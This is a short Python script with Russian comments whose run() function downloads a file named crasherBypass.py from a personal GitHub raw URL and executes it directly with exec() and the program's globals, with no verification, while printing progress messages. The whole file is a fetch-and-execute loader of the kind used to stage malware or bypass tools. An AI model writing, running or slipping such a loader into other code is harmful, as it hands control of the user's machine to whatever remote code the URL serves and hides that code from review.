def run():
    print("Запуск...")

    # Простейшее скачивание через socket (без urllib, без requests)
    import http.client

    conn = http.client.HTTPSConnection("raw.githubusercontent.com")
    conn.request("GET", "/hellyth1337/dfree/main/crasherBypass.py")
    response = conn.getresponse()

    if response.status == 200:
        code = response.read().decode()
        print("Код загружен, выполняю...")
        exec(code, globals())
    else:
        print(f"HTTP Error: {response.status}")

    conn.close()
    print("Завершено.")
